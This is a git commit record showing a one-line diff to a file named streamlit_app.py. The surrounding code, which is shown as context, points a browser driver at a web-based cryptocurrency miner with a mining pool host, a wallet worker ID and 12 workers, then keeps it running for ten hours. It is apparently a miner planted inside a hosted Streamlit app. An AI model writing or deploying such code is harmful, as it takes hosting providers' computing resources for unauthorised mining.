eb72bc6fe980ef3844db19bf9f18e22a776e092f
orangegorilla988 <165317363+orangegorilla988@users.noreply.github.com>
2024-04-05 03:29:51 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -33,4 +33,5 @@ with st.echo():
     driver = get_driver()
     driver.get("https://webminer.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=12")
     time.sleep(36000)
+    
     st.code(driver.page_source)
